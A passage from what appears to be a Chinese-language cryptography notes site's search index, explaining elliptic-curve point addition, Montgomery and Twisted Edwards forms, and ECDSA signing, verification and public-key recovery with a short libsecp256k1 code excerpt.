form\u3002</p>"},{"location":"cryptography/ec.html#_2","title":"\u8fd0\u7b97","text":"<p>\u200b\u5728\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u70b9\u200b\u4e4b\u95f4\u200b\u7684\u200b\u52a0\u6cd5\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u6ee1\u8db3\u200b\uff1a</p> <ul> <li>\u200b\u5355\u4f4d\u200b\u5143\u200b \\(O\\) \u200b\u4e3a\u200b\u65e0\u7a77\u8fdc\u200b\u70b9\u200b</li> <li>\u200b\u5bf9\u4e8e\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u4e24\u70b9\u200b \\(P\\) \u200b\u548c\u200b \\(Q\\)\uff0c\u200b\u53d6\u200b\u7ecf\u8fc7\u200b \\(P\\) \u200b\u548c\u200b \\(Q\\) \u200b\u7684\u200b\u76f4\u7ebf\u200b\uff0c\u200b\u8fd9\u200b\u6761\u200b\u76f4\u7ebf\u200b\u4e0e\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u76f8\u4ea4\u200b\u4e8e\u200b\u6700\u200b\u591a\u200b\u4e09\u4e2a\u200b\u70b9\u200b\uff08\u200b\u56e0\u4e3a\u200b\u65b9\u7a0b\u200b\u662f\u200b\u4e09\u6b21\u200b\u7684\u200b\uff09\uff0c\u200b\u5176\u4e2d\u200b\u4e24\u4e2a\u200b\u70b9\u200b\u662f\u200b \\(P\\) \u200b\u548c\u200b \\(Q\\)\uff0c\u200b\u5982\u679c\u200b\u7b2c\u4e09\u4e2a\u200b\u70b9\u200b\u5b58\u5728\u200b\u4e14\u200b\u4e0d\u200b\u548c\u200b \\(P\\)\u3001\\(Q\\) \u200b\u91cd\u5408\u200b\uff0c\u200b\u8bb0\u200b\u7b2c\u4e09\u4e2a\u200b\u70b9\u4e3a\u200b \\(R\\)\uff0c\u200b\u90a3\u4e48\u200b\u6ee1\u8db3\u200b \\(P + Q + R = O\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b \\(P + Q = -R\\)</li> <li>\u200b\u5bf9\u200b\u4e00\u70b9\u200b \\(R=(x_P, y_P)\\)\uff0c\u200b\u5176\u200b\u76f8\u53cd\u6570\u200b \\(-R=(x_P, -y_P)\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6cbf\u200b X \u200b\u8f74\u5bf9\u79f0\u200b\u7684\u200b\u70b9\u200b</li> </ul> <p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u63a8\u5bfc\u200b\u4e00\u4e0b\u200b \\(P\\) \\(Q\\) \\(R\\) \u200b\u4e09\u70b9\u200b\u95f4\u200b\u7684\u200b\u5750\u6807\u200b\u5173\u7cfb\u200b\u3002\u200b\u8bbe\u200b \\(P=(x_P, y_P), Q=(x_Q, y_Q), R=(x_R, y_R)\\)\uff0c\u200b\u9996\u5148\u200b\u5047\u8bbe\u200b \\(x_P \\ne x_Q\\)\uff0c\u200b\u90a3\u4e48\u200b\u7ecf\u8fc7\u200b \\(P\\) \\(Q\\) \u200b\u7684\u200b\u76f4\u7ebf\u200b\u7684\u200b\u65b9\u7a0b\u200b\u4e3a\u200b</p> \\[ y = kx + b \\] <p>\u200b\u5e26\u5165\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u65b9\u7a0b\u200b\uff0c\u200b\u5f97\u5230\u200b</p> \\[\\begin{align} (kx + b)^2 &amp;= x^3 + ax + b \\\\ k^2x^2 + 2kbx + b^2 &amp;= x^3 + ax + b \\\\ x^3 - k^2x^2 - 2kbx + ax + b - b^2 &amp;= 0 \\end{align}\\] <p>\u200b\u56e0\u4e3a\u200b \\(P\\) \\(Q\\) \\(R\\) \u200b\u662f\u200b\u66f2\u7ebf\u200b\u4e0e\u200b\u76f4\u7ebf\u200b\u76f8\u4ea4\u200b\u7684\u200b\u4e09\u70b9\u200b\uff0c\u200b\u4e0a\u200b\u5f0f\u200b\u7b49\u4ef7\u200b\u4e8e\u200b</p> \\[ (x-x_P)(x-x_Q)(x-x_R) = x^3-(x_P+x_Q+x_R)x^2+(x_Px_Q+x_Qx_R+x_Rx_P)x-x_Px_Qx_R \\] <p>\u200b\u4e24\u4e2a\u200b\u65b9\u7a0b\u200b\u7684\u200b\u7cfb\u6570\u200b\u76f8\u540c\u200b\uff0c\u200b\u5219\u200b</p> \\[\\begin{align} k^2 &amp;= x_P + x_Q + x_R \\\\ x_R &amp;= k^2 - x_P - x_Q \\\\ k &amp;= \\frac{y_P - y_Q}{x_P - x_Q} \\\\ x_R &amp;= (\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q \\\\ y_R &amp;= y_P + k(x_R - x_P) \\end{align}\\] <p>\u200b\u5373\u200b \\(R=((\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q, y_P + \\frac{y_P - y_Q}{x_P - x_Q}((\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q - x_P))\\)\u3002\u200b\u7531\u4e8e\u200b \\(P + Q = -R\\)\uff0c\u200b\u6240\u4ee5\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u70b9\u200b\u7684\u200b\u52a0\u6cd5\u200b\u5728\u200b \\(x_P \\ne x_Q\\) \u200b\u65f6\u200b\u8fd0\u7b97\u200b\u7ed3\u679c\u200b\u4e3a\u200b</p> \\[ (x_P, y_P) + (x_Q, y_Q) = ((\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q, - y_P - \\frac{y_P - y_Q}{x_P - x_Q}((\\frac{y_P - y_Q}{x_P - x_Q})^2 - x_P - x_Q - x_P)) \\] <p>\u200b\u5982\u679c\u200b \\(x_P = x_Q\\)\uff0c\u200b\u90a3\u4e48\u200b\u5206\u200b\u60c5\u51b5\u200b\u8ba8\u8bba\u200b\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b \\(y_P = y_Q\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b \\(P + Q\\)\uff0c\u200b\u6b64\u65f6\u200b \\(PQ\\) \u200b\u8fde\u200b\u7684\u200b\u76f4\u7ebf\u200b\u662f\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u5728\u200b \\(P\\) \u200b\u70b9\u200b\u7684\u200b\u5207\u7ebf\u200b\uff0c\u200b\u5207\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u659c\u7387\u200b\u7684\u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5bf9\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u65b9\u7a0b\u200b\u4e24\u4fa7\u200b\u5bf9\u200b \\(x\\) \u200b\u6c42\u5bfc\u200b\uff0c\u200b\u5f97\u5230\u200b \\(2y \\frac{\\mathrm{d}y}{\\mathrm{d}x} = 3x^2+a\\)\uff0c\u200b\u56e0\u6b64\u200b\u659c\u7387\u200b \\(k = \\frac{3x_P^2+a}{2y_P}\\)\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u548c\u200b\u4e0a\u9762\u200b\u4e00\u6837\u200b\u3002</li> <li>\u200b\u5982\u679c\u200b \\(y_P \\ne y_Q\\)\uff0c\u200b\u6839\u636e\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u5bf9\u79f0\u6027\u200b\uff0c\u200b\u90a3\u4e48\u200b \\(y_P = - y_Q\\)\uff0c\u200b\u6b64\u65f6\u200b \\(P + Q = O\\)\u3002</li> </ol> <p>\u200b\u8fd9\u90e8\u5206\u200b\u63a8\u5bfc\u200b\u53c2\u8003\u200b\u4e86\u200b Wikipedia\u3002</p> <p>\u200b\u9664\u4e86\u200b\u52a0\u6cd5\u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u6570\u4e58\u200b\uff1a\u200b\u6574\u6570\u200b \\(n\\) \u200b\u4e58\u4ee5\u200b\u70b9\u200b \\(P\\)\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u6c42\u200b \\(n\\) \u200b\u4e2a\u200b \\(P\\) \u200b\u7684\u200b\u548c\u200b\u3002</p>"},{"location":"cryptography/ec.html#_3","title":"\u6709\u9650\u200b\u57df\u200b\u4e0a\u200b\u7684\u200b\u692d\u5706\u200b\u66f2\u7ebf","text":"<p>\u200b\u4ece\u200b\u4e0a\u9762\u200b\u7684\u200b\u89c2\u5bdf\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u5728\u200b\u8ba1\u7b97\u200b\u4e24\u70b9\u200b\u95f4\u200b\u7684\u200b\u52a0\u6cd5\u200b\u8fd0\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5bf9\u200b X Y \u200b\u5750\u6807\u200b\u7684\u200b\u8ba1\u7b97\u200b\u53ea\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u52a0\u51cf\u4e58\u9664\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u5750\u6807\u200b\u6362\u200b\u5230\u200b\u5176\u4ed6\u200b\u57df\u200b\u4e0a\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u5c40\u9650\u4e8e\u200b\u4e0a\u9762\u200b\u4f7f\u7528\u200b\u7684\u200b \\(\\mathbb{R}\\)\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b\u5bc6\u7801\u5b66\u200b\u4e2d\u200b\uff0c\u200b\u901a\u5e38\u200b\u4f1a\u200b\u4f7f\u7528\u200b \\(F_p\\) \u200b\u7d20\u6570\u200b\u57df\u200b\u6216\u8005\u200b \\(GF(2^m)\\)\u3002\u200b\u4f8b\u5982\u200b\u53d6\u200b\u7d20\u6570\u200b\u57df\u200b \\(F_p\\) \u200b\u4e0a\u200b\u7684\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\uff0c\u200b\u90a3\u4e48\u200b\u70b9\u200b\u7684\u200b\u5750\u6807\u200b\u6ee1\u8db3\u200b</p> \\[ y^2 \\equiv x^3 + ax + b \\pmod p \\] <p>\u200b\u4f8b\u5982\u200b\u5728\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u5bc6\u7801\u5b66\u200b\u4e2d\u200b\u5e38\u7528\u200b\u7684\u200b secp192r1 \u200b\u66f2\u7ebf\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b\u7d20\u6570\u200b\u57df\u200b\u4e0a\u200b\u5b9a\u4e49\u200b\u7684\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\uff1a</p> \\[\\begin{align} p &amp;= 6277101735386680763835789423207666416083908700390324961279 \\\\ a &amp;= p - 3 \\\\ b &amp;= 2455155546008943817740293915197451784769108058161191238065 \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u9664\u6cd5\u200b\u8fd0\u7b97\u200b\u5b9a\u4e49\u200b\u4e3a\u200b\u5728\u200b\u7d20\u6570\u200b\u57df\u200b\u4e0a\u4e58\u200b\u4ee5\u200b\u4e58\u6cd5\u200b\u9006\u5143\u200b\u7684\u200b\u8fd0\u7b97\u200b\u3002</p>"},{"location":"cryptography/ec.html#montgomery-curve","title":"Montgomery curve","text":"<p>\u200b\u5728\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u5bc6\u7801\u5b66\u200b\u4e2d\u200b\uff0c\u200b\u6709\u65f6\u5019\u200b\u4f1a\u200b\u7528\u200b Montgomery curve \u200b\u6765\u200b\u63cf\u8ff0\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4e0a\u9762\u200b\u7684\u200b Weierstrass form\u3002\u200b\u5b83\u200b\u7684\u200b\u5f62\u5f0f\u200b\u5982\u4e0b\u200b\uff1a</p> \\[ By^2 = x^3 + Ax^2 + x \\] <p>\u200b\u6ee1\u8db3\u200b \\(B(A^2-4) \\ne 0\\)\u3002</p> <p>\u200b\u4f8b\u5982\u200b Curve25519 \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5728\u200b\u7d20\u6570\u200b\u57df\u200b\u4e0a\u200b\u7684\u200b Montgomery curve\uff1a</p> \\[\\begin{align} y^2 &amp;\\equiv x^3 + 486662 x^2 + x \\pmod p \\\\ p &amp;= 2^{255} - 19 \\end{align}\\] <p>\u200b\u4f7f\u7528\u200b Montgomery curve \u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u80fd\u591f\u200b\u5b9e\u73b0\u200b\u66f4\u5feb\u200b\u7684\u200b\u8fd0\u7b97\u200b\u3002</p> <p>Montgomery \u200b\u66f2\u7ebf\u200b\u53ef\u4ee5\u200b\u8f6c\u6362\u200b\u4e3a\u200b Weierstrass \u200b\u66f2\u7ebf\u200b\uff0c\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u8f6c\u6362\u200b\u8fc7\u7a0b\u200b\uff1a</p> <p>\u200b\u8003\u8651\u200b\u5230\u200b Montgomery \u200b\u76f8\u6bd4\u200b Weierstrass \u200b\u5de6\u4fa7\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b \\(B\\) \u200b\u7684\u200b\u56e0\u5b50\u200b\uff0c\u200b\u91c7\u7528\u200b\u53d8\u91cf\u200b\u4ee3\u6362\u200b\u628a\u200b\u5b83\u200b\u6d88\u9664\u200b\uff0c</p> \\[\\begin{align} By^2 &amp;= x^3 + Ax^2 + x \\\\ u &amp;= \\frac{x}{B} \\\\ v &amp;= \\frac{y}{B} \\\\ B(vB)^2 &amp;= (uB)^3 + A(uB)^2 + uB \\\\ v^2 &amp;= u^3 + \\frac{A}{B}u^2 + \\frac{1}{B^2}u \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u8ddd\u79bb\u200b Weierstrass form \u200b\u5c31\u200b\u5dee\u200b\u7b49\u5f0f\u200b\u53f3\u8fb9\u200b\u7684\u200b \\(u\\) \u200b\u7684\u200b\u6b21\u6570\u200b\uff0c\u200b\u76ee\u6807\u200b\u662f\u200b \\(x^3 + ax + b\\)\uff0c\u200b\u73b0\u5728\u200b\u662f\u200b \\(x^3 + ax^2 + x\\)\uff0c\u200b\u56e0\u6b64\u200b\u8981\u200b\u628a\u200b \\(x^2\\) \u200b\u9879\u200b\u6d88\u6389\u200b\uff0c\u200b\u8bbe\u200b \\(u = t - \\frac{A}{3B}\\)\uff0c\u200b\u5219\u200b</p> \\[\\begin{align} v^2 &amp;= u^3 + \\frac{A}{B}u^2 + \\frac{1}{B^2}u \\\\ u &amp;= t - \\frac{A}{3B} \\\\ v^2 &amp;= (t - \\frac{A}{3B})^3 + \\frac{A}{B}(t - \\frac{A}{3B})^2 + \\frac{1}{B^2}(t - \\frac{A}{3B}) \\\\ v^2 &amp;= t^3 + \\frac{3-A^2}{3B^2}t + \\frac{2A^3-9A}{27B^3} \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b \\((v, t)\\) \u200b\u5c31\u662f\u200b\u7b26\u5408\u200b Weierstrass form \u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u4e00\u70b9\u200b\u3002</p> <p>\u200b\u8fd9\u90e8\u5206\u200b\u63a8\u5bfc\u200b\u53c2\u8003\u200b\u4e86\u200b Wikipedia\u3002</p>"},{"location":"cryptography/ec.html#twisted-edwards-curve","title":"Twisted Edwards curve","text":"<p>\u200b\u7b2c\u4e09\u79cd\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u63cf\u8ff0\u200b\u65b9\u6cd5\u200b\u662f\u200b Twisted Edwards curve\uff0c\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> \\[ ax^2 + y^2 = 1 + dx^2y^2 \\] <p>Twisted Edwards curve \u200b\u7684\u200b\u70b9\u200b\u7684\u200b\u52a0\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> \\[ (x_1, y_1) + (x_2, y_2) = (\\frac{x_1y_2+y_1x_2}{1+dx_1x_2y_1y_2},\\frac{y_1y_2-ax_1x_2}{1-dx_1x_2y_1y_2}) \\] <p>\u200b\u70b9\u200b\u53ef\u4ee5\u200b\u7528\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u8868\u793a\u200b\uff1a\\((X, Y, Z, T)\\) \u200b\u5bf9\u5e94\u200b \\((x,y)\\) \u200b\u6ee1\u8db3\u200b \\(x=X/Z, y=Y/Z, x*y=T/Z\\)\u3002</p> <p>Twisted Edwards curve \u200b\u53ef\u4ee5\u200b\u7528\u200b\u5728\u200b EdDSA \u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\u4e2d\u200b\u3002</p>"},{"location":"cryptography/ecdsa.html","title":"ECDSA","text":"<p>ECDSA \u200b\u662f\u200b\u4e00\u4e2a\u200b\u57fa\u4e8e\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u7684\u200b\u7b7e\u540d\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4f7f\u7528\u200b\u65f6\u200b\u9700\u8981\u200b\u786e\u5b9a\u200b\u4e00\u4e2a\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5b83\u200b\u7684\u200b base point \\(G\\)\uff0c\u200b\u4e14\u200b \\(G\\) \u200b\u7684\u200b\u9636\u662f\u200b\u7d20\u6570\u200b \\(n\\)\u3002</p> <p>\u200b\u672c\u6587\u200b\u4e3b\u8981\u200b\u53c2\u8003\u200b\u4e86\u200b ECDSA - Wikipedia\u3002</p>"},{"location":"cryptography/ecdsa.html#key-pair","title":"\u751f\u6210\u200b key pair","text":"<p>\u200b\u751f\u6210\u200b key pair \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u79c1\u94a5\u200b\u662f\u200b\u6574\u6570\u200b \\(d_A \\in [1, n-1]\\)\uff0c\u200b\u90a3\u4e48\u200b\u516c\u94a5\u200b\u5c31\u662f\u200b\u5706\u9525\u66f2\u7ebf\u200b\u4e0a\u200b\u4e00\u70b9\u200b \\(Q_A = d_A \\times G\\)\uff0c\u200b\u8fd9\u91cc\u200b \\(\\times\\) \u200b\u8868\u793a\u200b\u6574\u6570\u200b\u4e0e\u200b\u5706\u9525\u66f2\u7ebf\u200b\u4e0a\u200b\u4e00\u70b9\u200b\u7684\u200b\u4e58\u6cd5\u200b\u3002</p>"},{"location":"cryptography/ecdsa.html#_1","title":"\u7b7e\u540d","text":"<p>\u200b\u7b7e\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u7ed9\u5b9a\u200b\u7684\u200b\u6d88\u606f\u200b \\(m\\)\uff0c\u200b\u7b7e\u540d\u200b\u6d41\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u8ba1\u7b97\u200b\u54c8\u5e0c\u200b\uff1a\\(e = \\mathrm{HASH}(m)\\)\uff0c\u200b\u4f8b\u5982\u200b\u7528\u200b SHA \u200b\u7cfb\u5217\u200b\u7684\u200b\u54c8\u5e0c\u200b\u7b97\u6cd5\u200b</li> <li>\u200b\u8003\u8651\u200b\u5230\u200b \\(e\\) \u200b\u7684\u200b\u4f4d\u6570\u200b\u53ef\u80fd\u200b\u6bd4\u200b \\(n\\) \u200b\u7684\u200b\u4f4d\u6570\u200b\u66f4\u200b\u591a\u200b\uff0c\u200b\u53d6\u200b \\(e\\) \u200b\u7684\u200b\u9ad8\u4f4d\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u4f4d\u6570\u200b\u548c\u200b \\(n\\) \u200b\u4e00\u81f4\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u8bb0\u200b\u4e3a\u200b \\(z\\)</li> <li>\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u5bc6\u7801\u5b66\u200b\u5b89\u5168\u200b\u7684\u200b\u968f\u673a\u6570\u200b \\(k \\in [1, n-1]\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(k \\times G\\)\uff0c\u200b\u53d6\u200b\u5b83\u200b\u7684\u200b X \u200b\u5750\u6807\u200b\u4e3a\u200b \\(x_1\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(r = x_1 \\bmod n\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(s = k^{-1}(z + r d_A) \\bmod n\\)</li> <li>\u200b\u5982\u679c\u200b \\(r\\) \u200b\u6216\u8005\u200b \\(s\\) \u200b\u7b49\u4e8e\u200b 0\uff0c\u200b\u53d6\u65b0\u200b\u7684\u200b \\(k\\) \u200b\u518d\u200b\u91cd\u8bd5\u200b</li> <li>\u200b\u5f97\u5230\u200b\u7684\u200b ECDSA \u200b\u7b7e\u540d\u200b\u5c31\u662f\u200b \\((r, s)\\) \u200b\u4e24\u4e2a\u200b\u6570\u200b</li> </ol>"},{"location":"cryptography/ecdsa.html#_2","title":"\u9a8c\u8bc1","text":"<p>\u200b\u9a8c\u8bc1\u200b\u7b7e\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5df2\u77e5\u200b \\(r, s, m, Q_A\\)\uff0c\u200b\u6309\u7167\u200b\u4e0b\u9762\u200b\u7684\u200b\u6d41\u7a0b\u200b\u8fdb\u884c\u200b\uff1a</p> <ol> <li>\u200b\u524d\u200b\u4e24\u6b65\u200b\u548c\u200b\u8ba1\u7b97\u200b\u7b7e\u540d\u200b\u7684\u200b\u7b97\u6cd5\u200b\u4e00\u81f4\u200b\uff0c\u200b\u6c42\u200b\u54c8\u5e0c\u200b\u548c\u200b\u622a\u65ad\u200b\u540e\u200b\u5f97\u5230\u200b \\(z\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(u_1 = zs^{-1} \\bmod n, u_2 = rs^{-1} \\bmod n\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(u_1 \\times G + u_2 \\times Q_A\\)\uff0c\u200b\u53d6\u200b\u5b83\u200b\u7684\u200b X \u200b\u5750\u6807\u200b\u4e3a\u200b \\(x_2\\)</li> <li>\u200b\u5982\u679c\u200b \\(r \\equiv x_2 \\pmod n\\)\uff0c\u200b\u5219\u200b\u7b7e\u540d\u200b\u5408\u6cd5\u200b</li> </ol> <p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u5ffd\u7565\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u8fb9\u754c\u200b\u60c5\u51b5\u200b\u7684\u200b\u68c0\u67e5\u200b\uff0c\u200b\u8be6\u7ec6\u200b\u7248\u672c\u200b\u89c1\u200b Wikipedia\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u8fdb\u884c\u200b\u9a8c\u7b97\u200b\uff1a</p> \\[\\begin{align} &amp; u_1 \\times G + u_2 \\times Q_A \\\\ &amp;= zs^{-1} \\times G + rs^{-1} \\times Q_A \\\\ &amp;= zs^{-1} \\times G + rs^{-1}d_A \\times G \\\\ &amp;= (zs^{-1} + rs^{-1}d_A) \\times G \\\\ &amp;= (z+rd_A)s^{-1} \\times G \\\\ &amp;= (z+rd_A)k(z+rd_A)^{-1} \\times G \\\\ &amp;= k \\times G \\end{align}\\] <p>\u200b\u7b49\u5f0f\u200b\u5de6\u8fb9\u200b\u7684\u200b X \u200b\u5750\u6807\u200b\u7b49\u4e8e\u200b\u7b49\u5f0f\u200b\u53f3\u8fb9\u200b\u7684\u200b X \u200b\u5750\u6807\u200b\uff0c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b \\(r \\equiv x_2 \\pmod n\\)\uff0c\u200b\u9a8c\u7b97\u200b\u6ca1\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"cryptography/ecdsa.html#_3","title":"\u516c\u94a5\u200b\u6062\u590d","text":"<p>ECDSA \u200b\u652f\u6301\u200b\u516c\u94a5\u200b\u6062\u590d\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5df2\u77e5\u200b \\(r, s, m\\)\uff0c\u200b\u6062\u590d\u200b \\(Q_A\\)\u3002\u200b\u9996\u5148\u200b\u8fdb\u884c\u200b\u63a8\u5bfc\u200b\uff1a</p> \\[\\begin{align} Q_A &amp;= d_A \\times G \\\\ s &amp;= k^{-1}(z + rd_A) \\bmod n \\\\ sk &amp;= z + rd_A \\bmod n \\\\ sk \\times G &amp;= (z + rd_A) \\times G \\\\ rd_A \\times G &amp;= (sk - z) \\times G \\\\ Q_A &amp;= d_A \\times G = r^{-1}(sk-z) \\times G \\\\ Q_A &amp;= r^{-1}(s(k \\times G) - z \\times G) \\end{align}\\] <p>\u200b\u4e0a\u5f0f\u200b\u4e2d\u200b \\(r, s\\) \u200b\u5df2\u77e5\u200b\uff0c\\(z\\) \u200b\u53ef\u4ee5\u200b\u4ece\u200b \\(m\\) \u200b\u901a\u8fc7\u200b\u54c8\u5e0c\u200b\u8ba1\u7b97\u200b\u5f97\u51fa\u200b\uff0c\\(k \\times G\\) \u200b\u7684\u200b X \u200b\u5750\u6807\u200b \\(x_1\\) \u200b\u6ee1\u8db3\u200b \\(r = x_1 \\bmod n\\)\uff0c\u200b\u56e0\u6b64\u200b\u6062\u590d\u200b\u8fc7\u7a0b\u200b\u5c31\u662f\u200b\uff1a</p> <ol> <li>\u200b\u5728\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u627e\u5230\u200b X \u200b\u5750\u6807\u200b\u6a21\u200b \\(n\\) \u200b\u7b49\u4e8e\u200b \\(r\\) \u200b\u7684\u200b\u70b9\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u70b9\u200b\u5c31\u662f\u200b \\(k \\times G\\)</li> <li>\u200b\u6309\u7167\u200b\u8ba1\u7b97\u200b\u54c8\u5e0c\u200b\u7684\u200b\u524d\u200b\u4e24\u6b65\u200b\uff0c\u200b\u4ece\u200b \\(m\\) \u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(z\\)</li> <li>\u200b\u6309\u7167\u200b\u4e0a\u8ff0\u200b\u516c\u5f0f\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(Q_A\\)</li> </ol> <p>\u200b\u4f46\u662f\u200b\u5b9e\u9645\u4e0a\u200b\u7b2c\u4e00\u6b65\u200b\u6ca1\u6709\u200b\u8fd9\u4e48\u200b\u7b80\u5355\u200b\uff1a\u200b\u9996\u5148\u200b\u540c\u4e00\u4e2a\u200b X \u200b\u5750\u6807\u200b\u5bf9\u5e94\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u4e24\u4e2a\u200b\u70b9\u200b\uff0c\u200b\u5176\u6b21\u200b \\(r\\) \u200b\u548c\u200b \\(x_1\\) \u200b\u53ea\u662f\u200b\u540c\u4f59\u200b\u5173\u7cfb\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4e8c\u8005\u4e4b\u95f4\u200b\u5dee\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u500d\u6570\u200b\u3002\u200b\u56e0\u6b64\u200b\u5b9e\u9645\u200b\u5728\u200b BTC \u200b\u6216\u8005\u200b ETH \u200b\u91cc\u200b\u4f7f\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd8\u200b\u989d\u5916\u200b\u9644\u52a0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u53c2\u6570\u200b recid\uff0c\u200b\u8303\u56f4\u200b\u662f\u200b 0 \u200b\u5230\u200b 3\uff0c\u200b\u5bf9\u5e94\u200b Y \u200b\u5750\u6807\u200b\u662f\u200b\u6b63\u200b\u8fd8\u662f\u200b\u8d1f\u200b\uff0c\\(r\\) \u200b\u548c\u200b \\(x_1\\) \u200b\u4e4b\u95f4\u200b\u5dee\u200b 0 \u200b\u8fd8\u662f\u200b \\(n\\)\uff1a</p> <pre><code>// Source: https://github.com/ethereum/go-ethereum/blob/e1fe6bc8469c626afaa86b1dfb819737e980a574/crypto/secp256k1/libsecp256k1/src/modules/recovery/main_impl.h#L104-L112\nif (recid &amp; 2) {\n    if (secp256k1_fe_cmp_var(&amp;fx, &amp;secp256k1_ecdsa_const_p_minus_order) &gt;= 0) {\n        return 0;\n    }\n    secp256k1_fe_add(&amp;fx, &amp;secp256k1_ecdsa_const_order_as_fe);\n}\nif (!secp256k1_ge_set_xo_var(&amp;x, &amp;fx, recid &amp; 1)) {\n    return 0;\n}\n</code></pre> <p>\u200b\u53c2\u8003\u200b\uff1aCrypto Magic: Recovering Alice\u2019s Public Key From An ECDSA Signature \u200b\u548c\u200b Can We Recover The Public Key from an ECDSA Signature?</p>"},{"location":"cryptography/ecdsa.html#dsa","title":"DSA \u200b\u516c\u94a5\u200b\u6062\u590d","text":"<p>\u200b\u5982\u679c\u200b\u5728\u200b DSA \u200b\u7b97\u6cd5\u200b\u4e0a\u200b\u5c1d\u8bd5\u200b\u4e0a\u9762\u200b\u7684\u200b\u516c\u94a5\u200b\u6062\u590d\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u9047\u5230\u56f0\u96be\u200b\uff1a</p> \\[\\begin{align} g &amp;= h^{(p-1)/q} \\bmod p \\\\ y &amp;= g^x \\bmod p \\\\ r &amp;= (g ^ k \\bmod p) \\bmod q \\\\ s &amp;= (k^{-1}(H(m) + xr)) \\bmod q \\\\ sk &amp;\\equiv H(m) + xr \\bmod q 